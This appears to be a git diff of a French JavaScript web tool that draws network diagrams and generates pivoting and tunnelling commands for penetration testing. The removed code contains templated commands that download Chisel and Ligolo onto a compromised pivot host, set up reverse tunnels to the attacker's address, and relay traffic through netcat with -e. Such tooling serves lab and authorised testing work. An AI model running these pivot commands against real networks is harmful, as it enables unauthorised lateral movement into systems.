@@ -104,7 +104,7 @@ class NetworkVisualizer {
         // Nœud attaquant
         this.nodes.add({
             id: 'attacker',
-            label: `🔥 Attaquant\n${config.attacker.ip}`,
+            label: `🔥 Attaquant\n${config.attacker.ip || '10.10.14.15'}`,
             color: {
                 background: '#dc3545',
                 border: '#c82333'
@@ -112,19 +112,22 @@ class NetworkVisualizer {
             group: 'attacker',
             x: -200,
             y: 0,
-            fixed: { x: true, y: false }
+            fixed: { x: true, y: false },
+            title: `Machine Attaquante\nIP: ${config.attacker.ip || '10.10.14.15'}\nPort: ${config.attacker.port || '4444'}`
         });
 
         // Target 1 (point d'entrée)
         if (config.target1.ip) {
             const network1 = this.getNetworkSegment(config.target1.ip);
+            const osIcon = this.getOSIcon(config.target1.os || 'linux');
             this.nodes.add({
                 id: 'target1',
-                label: `${this.getOSIcon(config.target1.os)} Target 1\n${config.target1.ip}\n(${config.target1.user || 'user'})`,
-                color: this.getNodeColor(config.target1.os),
+                label: `${osIcon} Target 1\n${config.target1.ip}\n${config.target1.user || 'user'}@${config.target1.ip}:${config.target1.port || '22'}`,
+                color: this.getNodeColor(config.target1.os || 'linux'),
                 group: network1,
                 x: 0,
-                y: -100
+                y: -100,
+                title: `Target 1 (Premier Pivot)\nIP: ${config.target1.ip}\nPort: ${config.target1.port || '22'}\nUtilisateur: ${config.target1.user || 'user'}\nOS: ${config.target1.os || 'linux'}`
             });
 
             // Connexion attaquant -> target1
@@ -134,20 +137,23 @@ class NetworkVisualizer {
                 to: 'target1',
                 label: 'Initial Access',
                 color: { color: '#28a745' },
-                width: 4
+                width: 4,
+                title: 'Accès initial depuis l\'attaquant'
             });
         }
 
         // Target 2 (destination)
         if (config.target2.ip) {
             const network2 = this.getNetworkSegment(config.target2.ip);
+            const osIcon = this.getOSIcon(config.target2.os || 'linux');
             this.nodes.add({
                 id: 'target2',
-                label: `${this.getOSIcon(config.target2.os)} Target 2\n${config.target2.ip}\n:${config.target2.port}`,
-                color: this.getNodeColor(config.target2.os),
+                label: `${osIcon} Target 2\n${config.target2.ip}\n${config.target2.user || 'user'}@${config.target2.ip}:${config.target2.port || '22'}`,
+                color: this.getNodeColor(config.target2.os || 'linux'),
                 group: network2,
                 x: 200,
-                y: 0
+                y: 0,
+                title: `Target 2 (Second Pivot)\nIP: ${config.target2.ip}\nPort: ${config.target2.port || '22'}\nUtilisateur: ${config.target2.user || 'user'}\nOS: ${config.target2.os || 'linux'}`
             });
 
             // Connexion target1 -> target2 (pivot)
@@ -159,7 +165,8 @@ class NetworkVisualizer {
                     label: 'Pivot',
                     color: { color: '#ffc107' },
                     width: 4,
-                    dashes: [10, 5]
+                    dashes: [10, 5],
+                    title: 'Pivot via Target 1'
                 });
             }
         }
@@ -169,14 +176,15 @@ class NetworkVisualizer {
             const network3 = this.getNetworkSegment(config.target3.ip);
             this.nodes.add({
                 id: 'target3',
-                label: `🎯 Target 3\n${config.target3.ip}\n:${config.target3.port}`,
+                label: `🎯 Target 3\n${config.target3.ip}\n:${config.target3.port || '3389'}`,
                 color: {
                     background: '#6f42c1',
                     border: '#5a31a5'
                 },
                 group: network3,
                 x: 400,
-                y: 100
+                y: 100,
+                title: `Target 3 (Double Pivot)\nIP: ${config.target3.ip}\nPort: ${config.target3.port || '3389'}`
             });
 
             // Connexion target2 -> target3 (double pivot)
@@ -187,7 +195,8 @@ class NetworkVisualizer {
                 label: 'Double Pivot',
                 color: { color: '#e83e8c' },
                 width: 4,
-                dashes: [15, 10]
+                dashes: [15, 10],
+                title: 'Double pivot via Target 2'
             });
         }
 
@@ -198,9 +207,7 @@ class NetworkVisualizer {
         this.generateExplanation();
         
         // Ajuster la vue
-        setTimeout(() => {
-            this.network.fit();
-        }, 500);
+        setTimeout(() => this.fitNetwork(), 100);
     }
 
     generateExplanation() {
@@ -426,132 +433,156 @@ class NetworkVisualizer {
     }
 
     showNodeInfo(nodeId) {
-        const node = this.nodes.get(nodeId);
-        const config = this.pivotMaster.config;
-        const infoContent = document.getElementById('networkInfoContent');
-        
-        if (!infoContent || !node) return;
+        const infoPanel = document.getElementById('networkInfoContent');
+        if (!infoPanel) return;
 
-        let info = '';
-        
-        switch(nodeId) {
-            case 'attacker':
-                info = `
-                    <div class="node-info">
+        const node = this.nodes.get(nodeId);
+        if (!node) return;
+
+        let infoHTML = '';
+
+        if (nodeId === 'attacker') {
+            infoHTML = `
+                <div class="node-info attacker-info">
+                    <div class="info-header">
                         <h5>🔥 Machine Attaquante</h5>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Adresse IP</div>
-                            <div class="node-info-value">${config.attacker.ip}</div>
+                    </div>
+                    <div class="info-details">
+                        <div class="info-item">
+                            <span class="info-label">IP:</span>
+                            <span class="info-value">${node.label.split('\n')[1]}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Port d'écoute</div>
-                            <div class="node-info-value">${config.attacker.port}</div>
+                        <div class="info-item">
+                            <span class="info-label">Port d'écoute:</span>
+                            <span class="info-value">${this.pivotMaster.config.attacker.port || '4444'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Rôle</div>
-                            <div class="node-info-value">Point de départ de l'attaque</div>
+                        <div class="info-item">
+                            <span class="info-label">Rôle:</span>
+                            <span class="info-value">Point de départ des attaques</span>
                         </div>
                     </div>
-                `;
-                break;
-            case 'target1':
-                info = `
-                    <div class="node-info">
-                        <h5>${this.getOSIcon(config.target1.os)} Target 1 - Point d'entrée</h5>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Adresse IP</div>
-                            <div class="node-info-value">${config.target1.ip}</div>
+                </div>
+            `;
+        } else if (nodeId.startsWith('host_')) {
+            // Host depuis le Host Manager
+            const hostIP = nodeId.replace('host_', '');
+            infoHTML = `
+                <div class="node-info host-info">
+                    <div class="info-header">
+                        <h5>🖥️ Host: ${hostIP}</h5>
+                    </div>
+                    <div class="info-details">
+                        <div class="info-item">
+                            <span class="info-label">IP:</span>
+                            <span class="info-value">${hostIP}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Utilisateur</div>
-                            <div class="node-info-value">${config.target1.user || 'N/A'}</div>
+                        <div class="info-item">
+                            <span class="info-label">Hostname:</span>
+                            <span class="info-value">${node.label.split('\n')[1] || 'Unknown'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Système d'exploitation</div>
-                            <div class="node-info-value">${config.target1.os}</div>
+                        <div class="info-item">
+                            <span class="info-label">OS:</span>
+                            <span class="info-value">${node.title.split('\n')[1]?.replace('OS: ', '') || 'Unknown'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Services ouverts</div>
-                            <div class="node-info-value">${config.target1.services || 'N/A'}</div>
+                        <div class="info-item">
+                            <span class="info-label">Services:</span>
+                            <span class="info-value">${node.title.split('\n')[2]?.replace('Services: ', '') || 'None'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Réseau</div>
-                            <div class="node-info-value">${this.getNetworkSegment(config.target1.ip)}</div>
+                        <div class="info-item">
+                            <span class="info-label">Réseau:</span>
+                            <span class="info-value">${node.group}</span>
                         </div>
                     </div>
-                `;
-                break;
-            case 'target2':
-                info = `
-                    <div class="node-info">
-                        <h5>${this.getOSIcon(config.target2.os)} Target 2 - Destination</h5>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Adresse IP</div>
-                            <div class="node-info-value">${config.target2.ip}</div>
+                </div>
+            `;
+        } else if (nodeId === 'target1') {
+            const config = this.pivotMaster.config.target1;
+            infoHTML = `
+                <div class="node-info target-info">
+                    <div class="info-header">
+                        <h5>🎯 Target 1 (Premier Pivot)</h5>
+                    </div>
+                    <div class="info-details">
+                        <div class="info-item">
+                            <span class="info-label">IP:</span>
+                            <span class="info-value">${config.ip}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Port cible</div>
-                            <div class="node-info-value">${config.target2.port}</div>
+                        <div class="info-item">
+                            <span class="info-label">Port:</span>
+                            <span class="info-value">${config.port || '22'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Système d'exploitation</div>
-                            <div class="node-info-value">${config.target2.os}</div>
+                        <div class="info-item">
+                            <span class="info-label">Utilisateur:</span>
+                            <span class="info-value">${config.user || 'user'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Réseau</div>
-                            <div class="node-info-value">${this.getNetworkSegment(config.target2.ip)}</div>
+                        <div class="info-item">
+                            <span class="info-label">OS:</span>
+                            <span class="info-value">${config.os || 'linux'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Accès via</div>
-                            <div class="node-info-value">Pivot depuis Target 1</div>
+                        <div class="info-item">
+                            <span class="info-label">Rôle:</span>
+                            <span class="info-value">Point d'entrée et premier pivot</span>
                         </div>
                     </div>
-                `;
-                break;
-            case 'target3':
-                info = `
-                    <div class="node-info">
-                        <h5>🎯 Target 3 - Double Pivot</h5>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Adresse IP</div>
-                            <div class="node-info-value">${config.target3.ip}</div>
+                </div>
+            `;
+        } else if (nodeId === 'target2') {
+            const config = this.pivotMaster.config.target2;
+            infoHTML = `
+                <div class="node-info target-info">
+                    <div class="info-header">
+                        <h5>🎯 Target 2 (Second Pivot)</h5>
+                    </div>
+                    <div class="info-details">
+                        <div class="info-item">
+                            <span class="info-label">IP:</span>
+                            <span class="info-value">${config.ip}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Port cible</div>
-                            <div class="node-info-value">${config.target3.port}</div>
+                        <div class="info-item">
+                            <span class="info-label">Port:</span>
+                            <span class="info-value">${config.port || '22'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Réseau</div>
-                            <div class="node-info-value">${this.getNetworkSegment(config.target3.ip)}</div>
+                        <div class="info-item">
+                            <span class="info-label">Utilisateur:</span>
+                            <span class="info-value">${config.user || 'user'}</span>
                         </div>
-                        <div class="node-info-item">
-                            <div class="node-info-label">Accès via</div>
-                            <div class="node-info-value">Double pivot depuis Target 2</div>
+                        <div class="info-item">
+                            <span class="info-label">OS:</span>
+                            <span class="info-value">${config.os || 'linux'}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Rôle:</span>
+                            <span class="info-value">Second pivot vers le réseau cible</span>
                         </div>
                     </div>
-                `;
-                break;
-            default:
-                if (nodeId.startsWith('net-')) {
-                    const network = nodeId.replace('net-', '');
-                    info = `
-                        <div class="node-info">
-                            <h5>📡 Segment Réseau</h5>
-                            <div class="node-info-item">
-                                <div class="node-info-label">Réseau</div>
-                                <div class="node-info-value">${network}</div>
-                            </div>
-                            <div class="node-info-item">
-                                <div class="node-info-label">Type</div>
-                                <div class="node-info-value">Segment isolé</div>
-                            </div>
+                </div>
+            `;
+        } else if (nodeId === 'target3') {
+            const config = this.pivotMaster.config.target3;
+            infoHTML = `
+                <div class="node-info target-info">
+                    <div class="info-header">
+                        <h5>🎯 Target 3 (Double Pivot)</h5>
+                    </div>
+                    <div class="info-details">
+                        <div class="info-item">
+                            <span class="info-label">IP:</span>
+                            <span class="info-value">${config.ip}</span>
                         </div>
-                    `;
-                }
-                break;
+                        <div class="info-item">
+                            <span class="info-label">Port:</span>
+                            <span class="info-value">${config.port || '3389'}</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Rôle:</span>
+                            <span class="info-value">Cible finale via double pivot</span>
+                        </div>
+                    </div>
+                </div>
+            `;
         }
 
-        infoContent.innerHTML = info;
+        infoPanel.innerHTML = infoHTML;
     }
 
     updateNetwork() {
@@ -636,6 +667,9 @@ class PivotMaster {
         this.setupEventListeners();
         this.loadDefaultValues();
         
+        // Charger les hosts depuis le Host Manager
+        this.loadHostsFromManager();
+        
         // Initialiser la visualisation réseau
         this.networkVisualizer = new NetworkVisualizer(this);
         await this.networkVisualizer.init();
@@ -661,8 +695,18 @@ class PivotMaster {
                 element.addEventListener('change', () => {
                     try {
                         this.saveConfig();
+                        this.updateNetworkVisualization();
                     } catch (error) {
                         console.error('Erreur lors de la sauvegarde de la configuration:', error);
+                    }
+                });
+                
+                // Ajouter aussi l'événement input pour les mises à jour en temps réel
+                element.addEventListener('input', () => {
+                    try {
+                        this.updateNetworkVisualization();
+                    } catch (error) {
+                        console.error('Erreur lors de la mise à jour de la visualisation:', error);
                     }
                 });
             }
@@ -686,11 +730,12 @@ class PivotMaster {
             doublePivotCheckbox.addEventListener('change', () => {
                 try {
                     this.toggleDoublePivot();
-                this.saveConfig();
+                    this.saveConfig();
+                    this.updateNetworkVisualization();
                 } catch (error) {
                     console.error('Erreur lors de la gestion du double pivot:', error);
                 }
-        });
+            });
         }
     }
 
@@ -717,25 +762,180 @@ class PivotMaster {
      * Restaurer les valeurs du formulaire
      */
     restoreFormValues() {
-        document.getElementById('attackerIP').value = this.config.attacker.ip || '10.10.14.15';
+        document.getElementById('attackerIp').value = this.config.attacker.ip || '10.10.14.15';
         document.getElementById('attackerPort').value = this.config.attacker.port || '4444';
         
-        document.getElementById('target1IP').value = this.config.target1.ip || '';
+        document.getElementById('target1Ip').value = this.config.target1.ip || '';
+        document.getElementById('target1Port').value = this.config.target1.port || '22';
         document.getElementById('target1User').value = this.config.target1.user || '';
-        document.getElementById('target1OS').value = this.config.target1.os || 'linux';
-        document.getElementById('target1Services').value = this.config.target1.services || '';
+        document.getElementById('target1Password').value = this.config.target1.password || '';
         
-        document.getElementById('target2IP').value = this.config.target2.ip || '';
+        document.getElementById('target2Ip').value = this.config.target2.ip || '';
         document.getElementById('target2Port').value = this.config.target2.port || '22';
-        document.getElementById('target2OS').value = this.config.target2.os || 'linux';
+        document.getElementById('target2User').value = this.config.target2.user || '';
+        document.getElementById('target2Password').value = this.config.target2.password || '';
         
         document.getElementById('doublePivot').checked = this.config.doublePivot || false;
         this.toggleDoublePivot();
         
         if (this.config.doublePivot) {
-            document.getElementById('target3IP').value = this.config.target3.ip || '';
+            document.getElementById('target3Ip').value = this.config.target3.ip || '';
             document.getElementById('target3Port').value = this.config.target3.port || '3389';
         }
+    }
+
+    /**
+     * Charger les hosts depuis le Host Manager
+     */
+    loadHostsFromManager() {
+        try {
+            const hostsData = localStorage.getItem('hostmanager_hosts');
+            if (hostsData) {
+                const hosts = JSON.parse(hostsData);
+                this.populateHostDropdowns(hosts);
+                this.updateNetworkFromHosts(hosts);
+            }
+        } catch (error) {
+            console.warn('Impossible de charger les hosts depuis le Host Manager:', error);
+        }
+    }
+
+    /**
+     * Remplir les dropdowns avec les hosts disponibles
+     */
+    populateHostDropdowns(hosts) {
+        // Créer des dropdowns pour sélectionner les hosts
+        const target1Select = this.createHostDropdown('target1Ip', hosts, 'Sélectionner Target 1');
+        const target2Select = this.createHostDropdown('target2Ip', hosts, 'Sélectionner Target 2');
+        
+        // Remplacer les inputs par les dropdowns
+        const target1Container = document.getElementById('target1Ip').parentNode;
+        const target2Container = document.getElementById('target2Ip').parentNode;
+        
+        if (target1Container && target1Select) {
+            target1Container.replaceChild(target1Select, document.getElementById('target1Ip'));
+        }
+        if (target2Container && target2Select) {
+            target2Container.replaceChild(target2Select, document.getElementById('target2Ip'));
+        }
+    }
+
+    /**
+     * Créer un dropdown pour sélectionner un host
+     */
+    createHostDropdown(id, hosts, placeholder) {
+        const select = document.createElement('select');
+        select.id = id;
+        select.className = 'form-control';
+        
+        // Option par défaut
+        const defaultOption = document.createElement('option');
+        defaultOption.value = '';
+        defaultOption.textContent = placeholder;
+        select.appendChild(defaultOption);
+        
+        // Options pour chaque host
+        hosts.forEach(host => {
+            const option = document.createElement('option');
+            option.value = host.ip;
+            option.textContent = `${host.ip} - ${host.hostname || 'Unknown'} (${host.os || 'Unknown OS'})`;
+            option.dataset.host = JSON.stringify(host);
+            select.appendChild(option);
+        });
+        
+        // Écouter les changements
+        select.addEventListener('change', (e) => {
+            if (e.target.value) {
+                const selectedHost = JSON.parse(e.target.selectedOptions[0].dataset.host);
+                this.fillHostInfo(id, selectedHost);
+            }
+        });
+        
+        return select;
+    }
+
+    /**
+     * Remplir les informations du host sélectionné
+     */
+    fillHostInfo(targetId, host) {
+        if (targetId === 'target1Ip') {
+            document.getElementById('target1User').value = host.user || '';
+            document.getElementById('target1Password').value = host.password || '';
+            // Détecter l'OS automatiquement
+            this.config.target1.os = this.detectOS(host.os);
+        } else if (targetId === 'target2Ip') {
+            document.getElementById('target2User').value = host.user || '';
+            document.getElementById('target2Password').value = host.password || '';
+            this.config.target2.os = this.detectOS(host.os);
+        }
+        
+        this.saveConfig();
+        this.updateNetworkVisualization();
+    }
+
+    /**
+     * Détecter l'OS à partir d'une chaîne
+     */
+    detectOS(osString) {
+        if (!osString) return 'linux';
+        
+        const osLower = osString.toLowerCase();
+        if (osLower.includes('windows')) return 'windows';
+        if (osLower.includes('mac') || osLower.includes('darwin')) return 'macos';
+        return 'linux';
+    }
+
+    /**
+     * Mettre à jour le réseau à partir des hosts
+     */
+    updateNetworkFromHosts(hosts) {
+        if (!this.networkVisualizer) return;
+        
+        // Ajouter les hosts comme nœuds dans le réseau
+        hosts.forEach(host => {
+            this.networkVisualizer.nodes.add({
+                id: `host_${host.ip}`,
+                label: `${this.getOSIcon(this.detectOS(host.os))} ${host.hostname || host.ip}\n${host.ip}`,
+                color: this.getNodeColor(this.detectOS(host.os)),
+                group: this.getNetworkSegment(host.ip),
+                title: `${host.hostname || 'Unknown'}\nOS: ${host.os || 'Unknown'}\nServices: ${host.services || 'None'}`
+            });
+        });
+        
+        this.networkVisualizer.updateNetwork();
+    }
+
+    /**
+     * Obtenir l'icône de l'OS
+     */
+    getOSIcon(os) {
+        const icons = {
+            'windows': '🪟',
+            'macos': '🍎',
+            'linux': '🐧'
+        };
+        return icons[os] || '🖥️';
+    }
+
+    /**
+     * Obtenir la couleur du nœud selon l'OS
+     */
+    getNodeColor(os) {
+        const colors = {
+            'windows': { background: '#0078d4', border: '#005a9e' },
+            'macos': { background: '#ff6b35', border: '#e55a2b' },
+            'linux': { background: '#fcc624', border: '#e6b800' }
+        };
+        return colors[os] || { background: '#6c757d', border: '#545b62' };
+    }
+
+    /**
+     * Obtenir le segment réseau
+     */
+    getNetworkSegment(ip) {
+        if (!ip) return 'unknown';
+        const parts = ip.split('.');
+        return `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
     }
 
     /**
@@ -822,240 +1022,125 @@ class PivotMaster {
     }
 
     /**
-     * Validation des données
+     * Valider les entrées du formulaire
      */
     validateInput() {
-        const errors = [];
-
-        if (!this.config.attacker.ip) {
-            errors.push('IP attaquant requis');
+        const target1Ip = document.getElementById('target1Ip')?.value;
+        const target1User = document.getElementById('target1User')?.value;
+        const target1Password = document.getElementById('target1Password')?.value;
+        
+        if (!target1Ip) {
+            this.showNotification('Veuillez saisir l\'IP de la Target 1', 'warning');
+            return false;
         }
-
-        if (!this.config.target1.ip) {
-            errors.push('IP Target 1 requis');
+        
+        if (!target1User) {
+            this.showNotification('Veuillez saisir l\'utilisateur de la Target 1', 'warning');
+            return false;
         }
-
-        if (!this.config.target2.ip) {
-            errors.push('IP Target 2 requis');
+        
+        if (!target1Password) {
+            this.showNotification('Veuillez saisir le mot de passe de la Target 1', 'warning');
+            return false;
         }
-
-        if (this.config.doublePivot && !this.config.target3.ip) {
-            errors.push('IP Target 3 requis pour double pivot');
+        
+        // Vérifier si double pivot est activé
+        const doublePivot = document.getElementById('doublePivot')?.checked;
+        if (doublePivot) {
+            const target2Ip = document.getElementById('target2Ip')?.value;
+            const target2User = document.getElementById('target2User')?.value;
+            const target2Password = document.getElementById('target2Password')?.value;
+            
+            if (!target2Ip) {
+                this.showNotification('Veuillez saisir l\'IP de la Target 2 pour le double pivot', 'warning');
+                return false;
+            }
+            
+            if (!target2User) {
+                this.showNotification('Veuillez saisir l\'utilisateur de la Target 2', 'warning');
+                return false;
+            }
+            
+            if (!target2Password) {
+                this.showNotification('Veuillez saisir le mot de passe de la Target 2', 'warning');
+                return false;
+            }
         }
-
-        if (this.selectedTechniques.size === 0) {
-            errors.push('Au moins une technique doit être sélectionnée');
-        }
-
-        return errors;
+        
+        return true;
     }
 
     /**
-     * Génération des commandes principales
+     * Générer les commandes pour un outil spécifique
+     */
+    generateToolCommands(tool) {
+        switch(tool) {
+            case 'ssh':
+                return this.generateSSHCommands();
+            case 'chisel':
+                return this.generateChiselCommands();
+            case 'ligolo':
+                return this.generateLigoloCommands();
+            case 'socat':
+                return this.generateSocatCommands();
+            case 'netcat':
+                return this.generateNetcatCommands();
+            case 'proxychains':
+                return this.generateProxyChainsCommands();
+            case 'rpivot':
+                return this.generateRPivotCommands();
+            case 'plink':
+                return this.generatePlinkCommands();
+            default:
+                return {
+                    title: 'Outil non supporté',
+                    description: 'Cet outil n\'est pas encore supporté',
+                    sections: []
+                };
+        }
+    }
+
+    /**
+     * Générer les commandes de pivot
      */
     generateCommands() {
         try {
-            // Récupérer les outils sélectionnés
+            // Valider les entrées
+            if (!this.validateInput()) {
+                return;
+            }
+
+            // Mettre à jour la configuration depuis le formulaire
+            this.updateConfigFromForm();
+            
+            // Mettre à jour la visualisation réseau
+            this.updateNetworkVisualization();
+
+            // Obtenir les outils sélectionnés
             const selectedTools = Array.from(document.querySelectorAll('input[name="tools"]:checked')).map(input => input.value);
             
             if (selectedTools.length === 0) {
-                this.showNotification('Veuillez sélectionner au moins un outil', 'warning');
-            return;
-        }
+                this.showNotification('Veuillez sélectionner au moins un outil de pivot', 'warning');
+                return;
+            }
 
-            // Récupérer les valeurs de configuration
-            const config = {
-                attacker: {
-                    ip: document.getElementById('attackerIp')?.value || '',
-                    port: document.getElementById('attackerPort')?.value || ''
-                },
-                target1: {
-                    ip: document.getElementById('target1Ip')?.value || '',
-                    port: document.getElementById('target1Port')?.value || '',
-                    user: document.getElementById('target1User')?.value || '',
-                    password: document.getElementById('target1Password')?.value || ''
-                },
-                target2: {
-                    ip: document.getElementById('target2Ip')?.value || '',
-                    port: document.getElementById('target2Port')?.value || '',
-                    user: document.getElementById('target2User')?.value || '',
-                    password: document.getElementById('target2Password')?.value || ''
-                },
-                doublePivot: document.getElementById('doublePivot')?.checked || false
-            };
+            console.log('🔧 Génération des commandes pour:', selectedTools);
 
-            // Générer les commandes pour chaque outil sélectionné
-            let allCommands = {};
+            // Générer les commandes pour chaque outil
+            const allCommands = {};
+            
             selectedTools.forEach(tool => {
-                switch(tool) {
-                    case 'ssh':
-                        allCommands.ssh = {
-                            title: 'SSH Tunneling',
-                            description: config.doublePivot ? 
-                                'Établissement d\'un tunnel SSH pour accéder au réseau cible via un double pivot' :
-                                'Établissement d\'un tunnel SSH pour accéder au réseau cible',
-                            sections: [
-                                {
-                                    title: '1. Configuration du Tunnel SSH',
-                                    description: config.doublePivot ?
-                                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible (Target 2)' :
-                                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Cette commande crée un tunnel SOCKS sur le port 1080 de la machine attaquante
-# -R : Crée un tunnel distant (remote)
-# 1080 : Port sur la machine attaquante
-# ${config.target2.ip}:${config.target2.port} : Machine et port cible
-# -N : Ne pas exécuter de commande distante (tunnel uniquement)
-ssh -R 1080:${config.target2.ip}:${config.target2.port} ${config.attacker.ip} -N`,
-                                    comment: 'Le tunnel SSH crée un proxy SOCKS sur le port 1080 de votre machine attaquante'
-                                }
-                            ]
-                        };
-                        break;
-                    case 'chisel':
-                        allCommands.chisel = {
-                            title: 'Chisel Tunneling',
-                            description: config.doublePivot ?
-                                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible via un double pivot' :
-                                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible',
-                            sections: [
-                                {
-                                    title: '1. Démarrage du Serveur Chisel',
-                                    description: 'Sur votre machine attaquante, démarrez le serveur Chisel',
-                                    command: `# Sur la machine attaquante
-# Télécharger Chisel si ce n'est pas déjà fait
-wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
-gunzip chisel_1.7.7_linux_amd64.gz
-chmod +x chisel_1.7.7_linux_amd64
-
-# Démarrer le serveur Chisel
-# -p : Port d'écoute
-# --reverse : Mode reverse shell
-./chisel_1.7.7_linux_amd64 server -p ${config.attacker.port} --reverse`,
-                                    comment: 'Le serveur Chisel écoute sur le port spécifié et attend les connexions des clients'
-                                },
-                                {
-                                    title: '2. Configuration du Client Chisel',
-                                    description: 'Sur la machine pivot, configurez et démarrez le client Chisel',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Télécharger Chisel
-wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
-gunzip chisel_1.7.7_linux_amd64.gz
-chmod +x chisel_1.7.7_linux_amd64
-
-# Démarrer le client Chisel
-# R:1080 : Crée un tunnel SOCKS sur le port 1080
-# ${config.target2.ip}:${config.target2.port} : Machine et port cible
-./chisel_1.7.7_linux_amd64 client ${config.attacker.ip}:${config.attacker.port} R:1080:${config.target2.ip}:${config.target2.port}`,
-                                    comment: 'Le client Chisel crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
-                                }
-                            ]
-                        };
-                        break;
-                    case 'ligolo':
-                        allCommands.ligolo = {
-                            title: 'Ligolo Tunneling',
-                            description: config.doublePivot ?
-                                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible via un double pivot' :
-                                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible',
-                            sections: [
-                                {
-                                    title: '1. Configuration du Serveur Ligolo',
-                                    description: 'Sur votre machine attaquante, configurez et démarrez le serveur Ligolo',
-                                    command: `# Sur la machine attaquante
-# Télécharger Ligolo si ce n'est pas déjà fait
-wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
-chmod +x ligolo-v0.4.4-linux-amd64
-
-# Démarrer le serveur Ligolo
-# -selfcert : Génère un certificat auto-signé
-# -laddr : Adresse et port d'écoute
-./ligolo-v0.4.4-linux-amd64 -selfcert -laddr 0.0.0.0:${config.attacker.port}`,
-                                    comment: 'Le serveur Ligolo écoute sur le port spécifié et attend les connexions des clients'
-                                },
-                                {
-                                    title: '2. Configuration du Client Ligolo',
-                                    description: 'Sur la machine pivot, configurez et démarrez le client Ligolo',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Télécharger Ligolo
-wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
-chmod +x ligolo-v0.4.4-linux-amd64
-
-# Démarrer le client Ligolo
-# -connect : Se connecte au serveur
-# -socks : Crée un tunnel SOCKS sur le port spécifié
-./ligolo-v0.4.4-linux-amd64 -connect ${config.attacker.ip}:${config.attacker.port} -socks 1080`,
-                                    comment: 'Le client Ligolo crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
-                                }
-                            ]
-                        };
-                        break;
-                    case 'socat':
-                        allCommands.socat = {
-                            title: 'Socat Tunneling',
-                            description: config.doublePivot ?
-                                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible via un double pivot' :
-                                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible',
-                            sections: [
-                                {
-                                    title: '1. Installation de Socat',
-                                    description: 'Sur la machine pivot, installez Socat si ce n\'est pas déjà fait',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Installation de Socat
-apt-get update && apt-get install -y socat  # Pour Debian/Ubuntu
-# ou
-yum install -y socat  # Pour RHEL/CentOS`,
-                                    comment: 'Socat doit être installé sur la machine pivot'
-                                },
-                                {
-                                    title: '2. Création du Tunnel',
-                                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Création du tunnel
-# TCP-LISTEN:1080 : Écoute sur le port 1080
-# fork : Permet plusieurs connexions simultanées
-# TCP:${config.target2.ip}:${config.target2.port} : Machine et port cible
-socat TCP-LISTEN:1080,fork TCP:${config.target2.ip}:${config.target2.port}`,
-                                    comment: 'Le tunnel Socat est maintenant actif sur le port 1080'
-                                }
-                            ]
-                        };
-                        break;
-                    case 'netcat':
-                        allCommands.netcat = {
-                            title: 'Netcat Tunneling',
-                            description: config.doublePivot ?
-                                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible via un double pivot' :
-                                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible',
-                            sections: [
-                                {
-                                    title: '1. Vérification de Netcat',
-                                    description: 'Sur la machine pivot, vérifiez que Netcat est installé',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Vérifier la version de Netcat
-nc -h`,
-                                    comment: 'Netcat doit être installé sur la machine pivot'
-                                },
-                                {
-                                    title: '2. Création du Tunnel',
-                                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
-                                    command: `# Sur Target 1 (Machine Pivot)
-# Création du tunnel
-# -l : Mode écoute
-# -p : Port d'écoute
-# -k : Garde la connexion ouverte
-nc -l -p 1080 -k -e nc ${config.target2.ip} ${config.target2.port}`,
-                                    comment: 'Le tunnel Netcat est maintenant actif sur le port 1080'
-                                }
-                            ]
-                        };
-                        break;
-                }
+                allCommands[tool] = this.generateToolCommands(tool);
             });
 
             // Afficher les résultats
             this.displayResults(allCommands);
-
+            
+            // Sauvegarder la configuration
+            this.saveConfig();
+            
+            this.showNotification('Commandes générées avec succès !', 'success');
+            
         } catch (error) {
             console.error('Erreur lors de la génération des commandes:', error);
             this.showNotification('Erreur lors de la génération des commandes', 'error');
